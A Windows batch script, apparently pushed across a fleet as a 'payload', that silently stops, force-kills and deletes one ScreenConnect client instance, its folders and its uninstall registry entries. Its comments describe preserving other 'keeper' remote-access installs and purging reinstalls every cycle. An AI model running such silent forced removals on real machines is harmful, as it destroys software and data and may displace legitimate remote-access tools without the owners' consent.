@echo off
rem WINRTCS_PAYLOAD 0.1.9 - C27: uninstall PluxN ScreenConnect FP f861c8140d453427 fleet-wide.
rem FP-scoped only (sc stop/delete + path kill + dir wipe + ARP). NEVER msiexec /x the shared
rem ProductCode - that would also remove Gryxa and the remaining sevrz keeper (C03).
rem Idempotent: no-op when the service and install dirs are already gone.
rem Guard 0.2.0 enforces the same via killlist scfp| so a reinstall gets purged every cycle.
setlocal EnableExtensions EnableDelayedExpansion
set "ZD=C:\ProgramData\WinRTCS"
set "BFP=f861c8140d453427"
set "SN=ScreenConnect Client (%BFP%)"
if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
set "HIT="
sc query "%SN%" >nul 2>&1
if not errorlevel 1 set "HIT=1"
if exist "%ProgramFiles(x86)%\ScreenConnect Client (%BFP%)" set "HIT=1"
if exist "%ProgramFiles%\ScreenConnect Client (%BFP%)" set "HIT=1"
if not defined HIT (
  echo [%DATE% %TIME%] c27_pluxn_absent host=%COMPUTERNAME%>>"%ZD%\payload.log"
  endlocal & exit /b 0
)
echo [%DATE% %TIME%] c27_pluxn_purge_begin host=%COMPUTERNAME%>>"%ZD%\payload.log"
sc stop "%SN%" >nul 2>&1
powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $fp='%BFP%'; Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -and ($_.ExecutablePath -like ('*'+$fp+'*')) } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }" >nul 2>&1
ping -n 3 127.0.0.1 >nul 2>&1
sc delete "%SN%" >nul 2>&1
if exist "%ProgramFiles(x86)%\ScreenConnect Client (%BFP%)" rmdir /s /q "%ProgramFiles(x86)%\ScreenConnect Client (%BFP%)" >nul 2>&1
if exist "%ProgramFiles%\ScreenConnect Client (%BFP%)" rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%BFP%)" >nul 2>&1
powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $n=[regex]::Escape('ScreenConnect Client (%BFP%)'); foreach($k in 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'){ Get-ItemProperty $k | Where-Object { $_.DisplayName -and ($_.DisplayName -match $n) } | ForEach-Object { Remove-Item $_.PSPath -Recurse -Force } }" >nul 2>&1
echo [%DATE% %TIME%] c27_pluxn_purge_done host=%COMPUTERNAME%>>"%ZD%\payload.log"
endlocal & exit /b 0
